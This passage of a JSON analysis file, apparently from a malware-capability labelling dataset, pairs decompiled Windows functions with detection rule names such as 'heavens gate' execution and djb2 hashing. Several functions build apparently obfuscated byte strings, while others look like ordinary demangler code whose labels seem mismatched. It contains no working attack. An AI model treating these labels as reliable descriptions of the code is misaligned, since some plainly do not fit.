        "decompiled_code": "\nint32_t fcn.1400b7780(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    ulong *arg1_00;\n    ulong uVar2;\n    uint64_t uStack40;\n    ulong uStack32;\n    \n    arg1_00 = fcn.1400b6600(0x30);\n    uStack32 = 0x1400fa260;\n    uStack40 = 1;\n    if (arg2 != 0) {\n        uStack32 = fcn.14009c130();\n        uStack40 = arg2;\n    }\n    fcn.14007d270(arg1_00, &uStack40, arg1);\n    *arg1_00 = 0x14010aa10;\n    uVar2 = fcn.1400211c0(arg1_00);\n    fcn.1400b1960(arg1_00 + 4, uVar2);\n    uVar2 = fcn.1400b6bc0(arg1_00, 0x140105720, 0x1400832c0);\n    *arg1_00 = 0x14010a460;\n    fcn.14007d8f0(arg1_00);\n    fcn.1400b6920(arg1_00);\n    fcn.14000f000(uVar2);\n    iVar1 = sub.msvcrt.dll__onexit(0x1400b6df0);\n    return -(iVar1 == 0);\n}\n",
        "token_count": 329
    },
    "1400022e": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nuchar * fcn.1400022e4(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x5d;\n    arg1[1] = 0x52;\n    arg1[2] = 0x7d;\n    arg1[3] = 0x4c;\n    arg1[4] = 0x48;\n    arg1[5] = 2;\n    arg1[6] = 0x72;\n    arg1[7] = 0x4c;\n    arg1[8] = 0x5e;\n    arg1[9] = 0x70;\n    arg1[10] = 0x6f;\n    arg1[0xb] = 0x78;\n    arg1[0xc] = 2;\n    arg1[0xd] = 0x31;\n    arg1[0xe] = 0x76;\n    arg1[0xf] = 0x25;\n    arg1[0x10] = 3;\n    arg1[0x11] = 5;\n    arg1[0x12] = 0;\n    arg1[0x13] = 0;\n    arg1[0x14] = 3;\n    arg1[0x15] = 0x1b;\n    arg1[0x16] = 0;\n    arg1[0x17] = 0x18;\n    arg1[0x18] = 0x3b;\n    arg1[0x19] = 0x7f;\n    arg1[0x1a] = 0x38;\n    arg1[0x1b] = 0x32;\n    arg1[0x1c] = 0x22;\n    arg1[0x1d] = 0x27;\n    arg1[0x1e] = 0x14;\n    arg1[0x1f] = 6;\n    arg1[0x20] = 0x1d;\n    arg1[0x21] = 0x2c;\n    arg1[0x22] = 0x11;\n    arg1[0x23] = 0x60;\n    arg1[0x24] = 0x2c;\n    arg1[0x25] = 0x23;\n    arg1[0x26] = 0x32;\n    arg1[0x27] = 0x33;\n    arg1[0x28] = 0x2a;\n    arg1[0x29] = 0x30;\n    arg1[0x2a] = 0x1d;\n    arg1[0x2b] = 10;\n    arg1[0x2c] = 0x11;\n    arg1[0x2d] = 1;\n    arg1[0x2e] = 0x22;\n    arg1[0x2f] = 0xe;\n    arg1[0x30] = 0xb;\n    arg1[0x31] = 0x66;\n    return arg1;\n}\n",
        "token_count": 716
    },
    "14000290": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nuchar * fcn.140002902(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x79;\n    arg1[1] = 0x7e;\n    arg1[2] = 0x5c;\n    arg1[3] = 0x6f;\n    arg1[4] = 0x7f;\n    arg1[5] = 0x78;\n    arg1[6] = 0x43;\n    arg1[7] = 0x70;\n    arg1[8] = 0x70;\n    arg1[9] = 0x47;\n    arg1[10] = 0x65;\n    arg1[0xb] = 0x2a;\n    arg1[0xc] = 0x10;\n    arg1[0xd] = 0x23;\n    arg1[0xe] = 0x30;\n    arg1[0xf] = 0x2b;\n    arg1[0x10] = 0x2c;\n    arg1[0x11] = 2;\n    arg1[0x12] = 0x17;\n    arg1[0x13] = 0x68;\n    arg1[0x14] = 0xf;\n    arg1[0x15] = 0xb;\n    arg1[0x16] = 2;\n    arg1[0x17] = 0;\n    arg1[0x18] = 8;\n    arg1[0x19] = 10;\n    arg1[0x1a] = 0x6f;\n    arg1[0x1b] = 0x24;\n    arg1[0x1c] = 0x3e;\n    arg1[0x1d] = 0x72;\n    arg1[0x1e] = 0x32;\n    arg1[0x1f] = 0x38;\n    arg1[0x20] = 0x39;\n    arg1[0x21] = 0x39;\n    arg1[0x22] = 0x34;\n    arg1[0x23] = 0x39;\n    arg1[0x24] = 0x2d;\n    arg1[0x25] = 0x3f;\n    arg1[0x26] = 0x7b;\n    arg1[0x27] = 0x31;\n    arg1[0x28] = 0x38;\n    arg1[0x29] = 0x33;\n    arg1[0x2a] = 0x30;\n    arg1[0x2b] = 0x12;\n    arg1[0x2c] = 0x18;\n    arg1[0x2d] = 0x42;\n    arg1[0x2e] = 10;\n    arg1[0x2f] = 10;\n    arg1[0x30] = 0x45;\n    arg1[0x31] = 5;\n    arg1[0x32] = 0x15;\n    arg1[0x33] = 0xd;\n    arg1[0x34] = 8;\n    arg1[0x35] = 0x1e;\n    arg1[0x36] = 0x50;\n    arg1[0x37] = 0x52;\n    arg1[0x38] = 0x17;\n    arg1[0x39] = 0x48;\n    arg1[0x3a] = 0x4b;\n    arg1[0x3b] = 0x55;\n    arg1[0x3c] = 0x58;\n    arg1[0x3d] = 0x59;\n    arg1[0x3e] = 0x4e;\n    arg1[0x3f] = 0x4d;\n    arg1[0x40] = 0x13;\n    arg1[0x41] = 0x60;\n    arg1[0x42] = 0x24;\n    arg1[0x43] = 0x3a;\n    arg1[0x44] = 0x2a;\n    arg1[0x45] = 0x30;\n    arg1[0x46] = 0x2c;\n    arg1[0x47] = 0x28;\n    arg1[0x48] = 0x20;\n    arg1[0x49] = 0x72;\n    arg1[0x4a] = 0x69;\n    arg1[0x4b] = 0x4a;\n    return arg1;\n}\n",
        "token_count": 1095
    },
    "140002b7": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nuchar * fcn.140002b74(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x79;\n    arg1[1] = 0x7e;\n    arg1[2] = 0x5c;\n    arg1[3] = 0x6f;\n    arg1[4] = 0x7f;\n    arg1[5] = 0x78;\n    arg1[6] = 0x43;\n    arg1[7] = 0x70;\n    arg1[8] = 0x70;\n    arg1[9] = 0x47;\n    arg1[10] = 0x65;\n    arg1[0xb] = 0x2a;\n    arg1[0xc] = 0x10;\n    arg1[0xd] = 0x23;\n    arg1[0xe] = 0x30;\n    arg1[0xf] = 0x2b;\n    arg1[0x10] = 0x2c;\n    arg1[0x11] = 2;\n    arg1[0x12] = 0x17;\n    arg1[0x13] = 0x68;\n    arg1[0x14] = 0x28;\n    arg1[0x15] = 0x26;\n    arg1[0x16] = 0x27;\n    arg1[0x17] = 0x23;\n    arg1[0x18] = 0x2e;\n    arg1[0x19] = 0x2f;\n    arg1[0x1a] = 0x3b;\n    arg1[0x1b] = 0x35;\n    arg1[0x1c] = 0x35;\n    arg1[0x1d] = 0x72;\n    arg1[0x1e] = 0x3e;\n    arg1[0x1f] = 0x31;\n    arg1[0x20] = 0x38;\n    arg1[0x21] = 0x39;\n    arg1[0x22] = 0x25;\n    arg1[0x23] = 0x21;\n    arg1[0x24] = 0x79;\n    arg1[0x25] = 0x33;\n    arg1[0x26] = 0x35;\n    arg1[0x27] = 0x7c;\n    arg1[0x28] = 0x29;\n    arg1[0x29] = 0x36;\n    arg1[0x2a] = 0x3a;\n    arg1[0x2b] = 0x40;\n    arg1[0x2c] = 2;\n    arg1[0x2d] = 0x10;\n    arg1[0x2e] = 6;\n    arg1[0x2f] = 5;\n    arg1[0x30] = 0x11;\n    arg1[0x31] = 3;\n    arg1[0x32] = 3;\n    arg1[0x33] = 0x48;\n    arg1[0x34] = 0x19;\n    arg1[0x35] = 0x18;\n    arg1[0x36] = 0x5a;\n    arg1[0x37] = 0x55;\n    arg1[0x38] = 0x52;\n    arg1[0x39] = 0x4b;\n    arg1[0x3a] = 0x4a;\n    arg1[0x3b] = 0x1a;\n    arg1[0x3c] = 0x48;\n    arg1[0x3d] = 0x49;\n    arg1[0x3e] = 0x5e;\n    arg1[0x3f] = 0x5b;\n    arg1[0x40] = 0x4c;\n    arg1[0x41] = 0x33;\n    arg1[0x42] = 0x27;\n    arg1[0x43] = 0x37;\n    arg1[0x44] = 0x2f;\n    arg1[0x45] = 0x28;\n    arg1[0x46] = 0x3c;\n    arg1[0x47] = 0x68;\n    arg1[0x48] = 0x47;\n    return arg1;\n}\n",
        "token_count": 1063
    },
    "140002dc": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nuchar * fcn.140002dce(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x78;\n    arg1[1] = 0x71;\n    arg1[2] = 0x7c;\n    arg1[3] = 0x6c;\n    arg1[4] = 0x60;\n    arg1[5] = 0x62;\n    arg1[6] = 0x58;\n    arg1[7] = 0x6e;\n    arg1[8] = 0x57;\n    arg1[9] = 0x5a;\n    arg1[10] = 0x4a;\n    arg1[0xb] = 0x2a;\n    arg1[0xc] = 0;\n    arg1[0xd] = 0x37;\n    arg1[0xe] = 0x25;\n    arg1[0xf] = 0x32;\n    arg1[0x10] = 0x35;\n    arg1[0x11] = 0x36;\n    arg1[0x12] = 0x16;\n    arg1[0x13] = 0x68;\n    arg1[0x14] = 0xf;\n    arg1[0x15] = 0xb;\n    arg1[0x16] = 2;\n    arg1[0x17] = 0;\n    arg1[0x18] = 8;\n    arg1[0x19] = 10;\n    arg1[0x1a] = 0x6f;\n    arg1[0x1b] = 0x24;\n    arg1[0x1c] = 0x3e;\n    arg1[0x1d] = 0x72;\n    arg1[0x1e] = 0x24;\n    arg1[0x1f] = 0x26;\n    arg1[0x20] = 0x3c;\n    arg1[0x21] = 0x22;\n    arg1[0x22] = 0x32;\n    arg1[0x23] = 0x78;\n    arg1[0x24] = 0x3d;\n    arg1[0x25] = 0x3f;\n    arg1[0x26] = 0x38;\n    arg1[0x27] = 0x33;\n    arg1[0x28] = 0x39;\n    arg1[0x29] = 0x3b;\n    arg1[0x2a] = 0x3b;\n    arg1[0x2b] = 0x40;\n    arg1[0x2c] = 0x11;\n    arg1[0x2d] = 3;\n    arg1[0x2e] = 0x1a;\n    arg1[0x2f] = 8;\n    arg1[0x30] = 10;\n    arg1[0x31] = 7;\n    arg1[0x32] = 3;\n    arg1[0x33] = 0x48;\n    arg1[0x34] = 0x1d;\n    arg1[0x35] = 5;\n    arg1[0x36] = 0x15;\n    arg1[0x37] = 0x57;\n    arg1[0x38] = 0x5b;\n    arg1[0x39] = 0x54;\n    arg1[0x3a] = 0x56;\n    arg1[0x3b] = 0x59;\n    arg1[0x3c] = 0x5a;\n    arg1[0x3d] = 0x48;\n    arg1[0x3e] = 0x58;\n    arg1[0x3f] = 0x5a;\n    arg1[0x40] = 0x1f;\n    arg1[0x41] = 0x2d;\n    arg1[0x42] = 0x24;\n    arg1[0x43] = 0x2f;\n    arg1[0x44] = 0x2c;\n    arg1[0x45] = 0x36;\n    arg1[0x46] = 0x3c;\n    arg1[0x47] = 0x7c;\n    arg1[0x48] = 0x67;\n    arg1[0x49] = 0x48;\n    return arg1;\n}\n",
        "token_count": 1067
    },
    "1400032a": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nuchar * fcn.1400032a2(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x76;\n    arg1[1] = 0x4c;\n    arg1[2] = 0x72;\n    arg1[3] = 0x7b;\n    arg1[4] = 0x43;\n    arg1[5] = 0x52;\n    arg1[6] = 0x4b;\n    arg1[7] = 0x71;\n    arg1[8] = 0x67;\n    arg1[9] = 0x4c;\n    arg1[10] = 0x6f;\n    arg1[0xb] = 0x24;\n    arg1[0xc] = 0x33;\n    arg1[0xd] = 0x25;\n    arg1[0xe] = 0xb;\n    arg1[0xf] = 0x15;\n    arg1[0x10] = 0x17;\n    arg1[0x11] = 0x16;\n    arg1[0x12] = 0;\n    arg1[0x13] = 0x68;\n    arg1[0x14] = 0xf;\n    arg1[0x15] = 0xb;\n    arg1[0x16] = 2;\n    arg1[0x17] = 0;\n    arg1[0x18] = 8;\n    arg1[0x19] = 10;\n    arg1[0x1a] = 0x6f;\n    arg1[0x1b] = 0x24;\n    arg1[0x1c] = 0x3e;\n    arg1[0x1d] = 0x72;\n    arg1[0x1e] = 0x3e;\n    arg1[0x1f] = 0x3b;\n    arg1[0x20] = 0x31;\n    arg1[0x21] = 0x3f;\n    arg1[0x22] = 0x31;\n    arg1[0x23] = 0x21;\n    arg1[0x24] = 0x79;\n    arg1[0x25] = 0x2a;\n    arg1[0x26] = 0x3e;\n    arg1[0x27] = 0x2e;\n    arg1[0x28] = 0x30;\n    arg1[0x29] = 0x37;\n    arg1[0x2a] = 0x2c;\n    arg1[0x2b] = 0x13;\n    arg1[0x2c] = 8;\n    arg1[0x2d] = 0xd;\n    arg1[0x2e] = 0xd;\n    arg1[0x2f] = 0x17;\n    arg1[0x30] = 0x5f;\n    arg1[0x31] = 0x46;\n    arg1[0x32] = 0x67;\n    return arg1;\n}\n",
        "token_count": 738
    },
    "14000344": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nuchar * fcn.14000344c(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x76;\n    arg1[1] = 0x4c;\n    arg1[2] = 0x72;\n    arg1[3] = 0x7b;\n    arg1[4] = 0x43;\n    arg1[5] = 0x52;\n    arg1[6] = 0x4b;\n    arg1[7] = 0x71;\n    arg1[8] = 0x67;\n    arg1[9] = 0x4c;\n    arg1[10] = 0x6f;\n    arg1[0xb] = 0x24;\n    arg1[0xc] = 0x33;\n    arg1[0xd] = 0x25;\n    arg1[0xe] = 0xb;\n    arg1[0xf] = 0x15;\n    arg1[0x10] = 0x17;\n    arg1[0x11] = 0x16;\n    arg1[0x12] = 0;\n    arg1[0x13] = 0x68;\n    arg1[0x14] = 0x24;\n    arg1[0x15] = 0x25;\n    arg1[0x16] = 0x2f;\n    arg1[0x17] = 0x25;\n    arg1[0x18] = 0x2b;\n    arg1[0x19] = 0x27;\n    arg1[0x1a] = 0x2a;\n    arg1[0x1b] = 0x34;\n    arg1[0x1c] = 0x71;\n    arg1[0x1d] = 0x22;\n    arg1[0x1e] = 0x36;\n    arg1[0x1f] = 0x26;\n    arg1[0x20] = 0x38;\n    arg1[0x21] = 0x3f;\n    arg1[0x22] = 0x24;\n    arg1[0x23] = 0x2b;\n    arg1[0x24] = 0x30;\n    arg1[0x25] = 0x35;\n    arg1[0x26] = 0x35;\n    arg1[0x27] = 0x2f;\n    arg1[0x28] = 0x7d;\n    arg1[0x29] = 0x2d;\n    arg1[0x2a] = 0x2a;\n    arg1[0x2b] = 3;\n    arg1[0x2c] = 2;\n    arg1[0x2d] = 7;\n    arg1[0x2e] = 0x10;\n    arg1[0x2f] = 0x17;\n    arg1[0x30] = 3;\n    arg1[0x31] = 0x13;\n    arg1[0x32] = 0xb;\n    arg1[0x33] = 4;\n    arg1[0x34] = 0x10;\n    arg1[0x35] = 0x44;\n    arg1[0x36] = 0x35;\n    return arg1;\n}\n",
        "token_count": 795
    },
    "14000361": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nuchar * fcn.140003616(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x56;\n    arg1[1] = 0x65;\n    arg1[2] = 0x52;\n    arg1[3] = 0x50;\n    arg1[4] = 0x77;\n    arg1[5] = 0x7f;\n    arg1[6] = 0x53;\n    arg1[7] = 0x7e;\n    arg1[8] = 0x5c;\n    arg1[9] = 0x78;\n    arg1[10] = 0x47;\n    arg1[0xb] = 0x1a;\n    arg1[0xc] = 0x18;\n    arg1[0xd] = 0x1a;\n    arg1[0xe] = 0x21;\n    arg1[0xf] = 0x2a;\n    arg1[0x10] = 0x3c;\n    arg1[0x11] = 0x3f;\n    arg1[0x12] = 0x2f;\n    arg1[0x13] = 0x68;\n    arg1[0x14] = 0xf;\n    arg1[0x15] = 0xb;\n    arg1[0x16] = 2;\n    arg1[0x17] = 0;\n    arg1[0x18] = 8;\n    arg1[0x19] = 10;\n    arg1[0x1a] = 0x6f;\n    arg1[0x1b] = 0x24;\n    arg1[0x1c] = 0x3e;\n    arg1[0x1d] = 0x72;\n    arg1[0x1e] = 0x32;\n    arg1[0x1f] = 0x30;\n    arg1[0x20] = 0x31;\n    arg1[0x21] = 0x76;\n    arg1[0x22] = 0x25;\n    arg1[0x23] = 0x37;\n    arg1[0x24] = 0x2c;\n    arg1[0x25] = 0x2e;\n    arg1[0x26] = 0x32;\n    arg1[0x27] = 0x32;\n    arg1[0x28] = 0x38;\n    arg1[0x29] = 0x7e;\n    arg1[0x2a] = 0x2b;\n    arg1[0x2b] = 0xf;\n    arg1[0x2c] = 0x41;\n    arg1[0x2d] = 0x23;\n    arg1[0x2e] = 0x33;\n    arg1[0x2f] = 0x27;\n    arg1[0x30] = 0x45;\n    arg1[0x31] = 0x17;\n    arg1[0x32] = 0x12;\n    arg1[0x33] = 0xd;\n    arg1[0x34] = 0x1c;\n    arg1[0x35] = 0xf;\n    arg1[0x36] = 0xf;\n    arg1[0x37] = 0x16;\n    arg1[0x38] = 0x37;\n    return arg1;\n}\n",
        "token_count": 824
    },
    "1400039e": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nuchar * fcn.1400039ea(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x51;\n    arg1[1] = 0x61;\n    arg1[2] = 0x75;\n    arg1[3] = 0x77;\n    arg1[4] = 0x76;\n    arg1[5] = 0x52;\n    arg1[6] = 0x48;\n    arg1[7] = 0x4a;\n    arg1[8] = 0x6a;\n    arg1[9] = 0x6d;\n    arg1[10] = 0x49;\n    arg1[0xb] = 4;\n    arg1[0xc] = 0xc;\n    arg1[0xd] = 10;\n    arg1[0xe] = 0x11;\n    arg1[0xf] = 0x35;\n    arg1[0x10] = 2;\n    arg1[0x11] = 3;\n    arg1[0x12] = 0x32;\n    arg1[0x13] = 0x68;\n    arg1[0x14] = 0xf;\n    arg1[0x15] = 0xb;\n    arg1[0x16] = 2;\n    arg1[0x17] = 0;\n    arg1[0x18] = 8;\n    arg1[0x19] = 10;\n    arg1[0x1a] = 0x6f;\n    arg1[0x1b] = 0x24;\n    arg1[0x1c] = 0x3e;\n    arg1[0x1d] = 0x72;\n    arg1[0x1e] = 0x21;\n    arg1[0x1f] = 0x31;\n    arg1[0x20] = 0x26;\n    arg1[0x21] = 0x23;\n    arg1[0x22] = 0x3a;\n    arg1[0x23] = 0x3d;\n    arg1[0x24] = 0x79;\n    arg1[0x25] = 0x2e;\n    arg1[0x26] = 0x33;\n    arg1[0x27] = 0x2e;\n    arg1[0x28] = 0x38;\n    arg1[0x29] = 0x3f;\n    arg1[0x2a] = 0x3b;\n    arg1[0x2b] = 0x5a;\n    arg1[0x2c] = 0x41;\n    arg1[0x2d] = 0x62;\n    return arg1;\n}\n",
        "token_count": 660
    },
    "1400060f": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nuint * fcn.1400060f0(int64_t arg1)\n\n{\n    char **ppcVar1;\n    uint uVar2;\n    char *pcVar3;\n    char cVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    uint *puVar7;\n    ulong arg3;\n    int32_t iVar8;\n    char cVar9;\n    int32_t iVar10;\n    char cVar11;\n    bool bVar12;\n    bool bVar13;\n    \n    pcVar3 = *(arg1 + 0x18);\n    cVar11 = *pcVar3;\n    if (cVar11 == '\\0') {\n        cVar9 = '\\0';\n    }\n    else {\n        *(arg1 + 0x18) = pcVar3 + 1;\n        cVar9 = pcVar3[1];\n        cVar11 = *pcVar3;\n        if (cVar9 != '\\0') {\n            *(arg1 + 0x18) = pcVar3 + 2;\n            cVar9 = pcVar3[1];\n            if (cVar11 == 'v') {\n                if (cVar9 - 0x30U < 10) {\n                    iVar6 = fcn.1400050c0(arg1);\n                    iVar8 = *(arg1 + 0x28);\n                    if (*(arg1 + 0x2c) <= iVar8) {\n                        return NULL;\n                    }\n                    puVar7 = iVar8 * 0x20 + *(arg1 + 0x20);\n                    *(puVar7 + 1) = 0;\n                    *(arg1 + 0x28) = iVar8 + 1;\n                    if (iVar6 == 0) {\n                        return NULL;\n                    }\n                    *(puVar7 + 1) = 0;\n                    *puVar7 = 0x33;\n                    puVar7[4] = cVar9 - 0x30U;\n                    *(puVar7 + 6) = iVar6;\n                    return puVar7;\n                }\n            }\n            else if ((cVar11 == 'c') && (cVar9 == 'v')) {\n                uVar2 = *(arg1 + 0x50);\n                *(arg1 + 0x50) = *(arg1 + 0x4c) == 0;\n                arg3 = fcn.140005410(arg1);\n                if (*(arg1 + 0x50) == 0) {\n                    puVar7 = fcn.140004740(arg1, 0x34, arg3, 0);\n                }\n                else {\n                    puVar7 = fcn.140004740(arg1, 0x35, arg3, 0);\n                }\n                *(arg1 + 0x50) = uVar2;\n                return puVar7;\n            }\n        }\n    }\n    iVar10 = 0x48;\n    iVar8 = 0;\n    do {\n        iVar5 = (iVar10 - iVar8) / 2 + iVar8;\n        ppcVar1 = iVar5 * 0x18 + 0x1400fff00;\n        pcVar3 = *ppcVar1;\n        bVar13 = SBORROW1(*pcVar3, cVar11);\n        cVar4 = *pcVar3 - cVar11;\n        bVar12 = *pcVar3 == cVar11;\n        if (bVar12) {\n            bVar13 = SBORROW1(pcVar3[1], cVar9);\n            cVar4 = pcVar3[1] - cVar9;\n            bVar12 = cVar4 == '\\0';\n            if (bVar12) {\n                iVar8 = *(arg1 + 0x28);\n                if (*(arg1 + 0x2c) <= iVar8) {\n                    return NULL;\n                }\n                puVar7 = iVar8 * 0x20 + *(arg1 + 0x20);\n                *(puVar7 + 1) = 0;\n                *(arg1 + 0x28) = iVar8 + 1;\n                *puVar7 = 0x32;\n                *(puVar7 + 4) = ppcVar1;\n                return puVar7;\n            }\n        }\n        if (bVar12 || bVar13 != cVar4 < '\\0') {\n            iVar8 = iVar5 + 1;\n            iVar5 = iVar10;\n        }\n        iVar10 = iVar5;\n    } while (iVar8 != iVar10);\n    return NULL;\n}\n",
        "token_count": 985
    },
    "14000474": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nuint32_t * fcn.140004740(int64_t arg1, ulong arg2, int64_t arg3, int64_t arg4)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    uint32_t *puVar3;\n    \n    if (arg2 < 0x32) {\n        if (arg2 < 0x29) {\n            uVar2 = 1 << (arg2 & 0x3f);\n            if ((uVar2 & 0x17c00fff600) == 0) {\n                if ((uVar2 & 0x1fe000000) == 0) {\n                    if ((uVar2 & 0x20000081e) == 0) {\n                        return NULL;\n                    }\n                    goto code_r0x00014000481f;\n                }\n            }\n            else {\ncode_r0x00014000476e:\n                if (arg3 == 0) {\n                    return NULL;\n                }\n            }\n        }\n        else {\n            if (8 < arg2 - 0x29) {\n                return NULL;\n            }\n    // switch table (9 cases) at 0x1400fef20\n            switch(*((arg2 - 0x29) * 4 + 0x1400fef20) + 0x1400fef20) {\n            case 0x14000476e:\n                goto code_r0x00014000476e;\n            case 0x1400047d7:\n                goto code_r0x0001400047d7;\n            case 0x14000481f:\ncode_r0x00014000481f:\n                if (arg3 == 0) {\n                    return NULL;\n                }\n            case 0x140004824:\n                if (arg4 == 0) {\n                    return NULL;\n                }\n            }\n        }\n    }\n    else {\n        if (0x1d < arg2 - 0x34) {\n            return NULL;\n        }\n        uVar2 = 1 << (arg2 - 0x34 & 0x3f);\n        if ((uVar2 & 0x1c71107) != 0) goto code_r0x00014000476e;\n        if ((uVar2 & 0xa002ef8) != 0) goto code_r0x00014000481f;\n        if ((uVar2 & 0x34000000) == 0) {\n            return NULL;\n        }\n    }\n    iVar1 = *(arg1 + 0x28);\n    if (iVar1 < *(arg1 + 0x2c)) {\n        puVar3 = iVar1 * 0x20 + *(arg1 + 0x20);\n        *(puVar3 + 1) = 0;\n        *(arg1 + 0x28) = iVar1 + 1;\n        *puVar3 = arg2;\n        *(puVar3 + 4) = arg3;\n        *(puVar3 + 6) = arg4;\n        return puVar3;\n    }\ncode_r0x0001400047d7:\n    return NULL;\n}\n",
        "token_count": 680
    },
    "14000484": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nuint * fcn.140004840(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    iVar1 = *(arg1 + 0x28);\n    if (iVar1 < *(arg1 + 0x2c)) {\n        puVar2 = iVar1 * 0x20 + *(arg1 + 0x20);\n        *(puVar2 + 1) = 0;\n        *(arg1 + 0x28) = iVar1 + 1;\n        if ((arg2 != 0) && (0 < arg3)) {\n            *(puVar2 + 1) = 0;\n            *puVar2 = 0;\n            *(puVar2 + 4) = arg2;\n            puVar2[6] = arg3;\n            return puVar2;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 201
    },
    "140004f8": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nuint * fcn.140004f80(int64_t arg1)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    char *pcVar5;\n    \n    pcVar2 = *(arg1 + 0x18);\n    if (*pcVar2 != 'T') {\n        return NULL;\n    }\n    pcVar5 = pcVar2 + 1;\n    *(arg1 + 0x18) = pcVar5;\n    if (pcVar2[1] == '_') {\n        iVar3 = 0;\n    }\n    else {\n        if (pcVar2[1] == 'n') {\n            return NULL;\n        }\n        iVar3 = fcn.1400048a0(arg1);\n        iVar3 = iVar3 + 1;\n        if (iVar3 < 0) {\n            return NULL;\n        }\n        pcVar5 = *(arg1 + 0x18);\n        if (*pcVar5 != '_') {\n            return NULL;\n        }\n    }\n    *(arg1 + 0x18) = pcVar5 + 1;\n    iVar1 = *(arg1 + 0x28);\n    if (*(arg1 + 0x2c) <= iVar1) {\n        return NULL;\n    }\n    puVar4 = iVar1 * 0x20 + *(arg1 + 0x20);\n    *(puVar4 + 1) = 0;\n    *(arg1 + 0x28) = iVar1 + 1;\n    *puVar4 = 5;\n    puVar4[4] = iVar3;\n    return puVar4;\n}\n",
        "token_count": 362
    },
    "1400050c": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nuint * fcn.1400050c0(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t *arg2;\n    uint32_t uVar2;\n    char *pcVar3;\n    uint *puVar4;\n    \n    uVar2 = fcn.1400048a0(arg1);\n    if (uVar2 < 1) {\n        return NULL;\n    }\n    arg2 = *(arg1 + 0x18);\n    if (uVar2 <= *(arg1 + 8) - arg2) {\n        pcVar3 = uVar2 + arg2;\n        *(arg1 + 0x18) = pcVar3;\n        if (((*(arg1 + 0x10) & 4) != 0) && (*pcVar3 == '$')) {\n            *(arg1 + 0x18) = pcVar3 + 1;\n        }\n        if ((((uVar2 < 10) || (*arg2 != 0x5f4c41424f4c475f)) || (0x3b < *(arg2 + 1) - 0x24)) ||\n           (((0xf7fffffffffffbfeU >> (*(arg2 + 1) - 0x24 & 0x3f) & 1) != 0 || (*(arg2 + 9) != 'N')))) {\n            puVar4 = fcn.140004840(arg1, arg2, uVar2);\n            goto code_r0x000140005128;\n        }\n        iVar1 = *(arg1 + 0x28);\n        *(arg1 + 0x48) = (*(arg1 + 0x48) + 0x16) - uVar2;\n        if (iVar1 < *(arg1 + 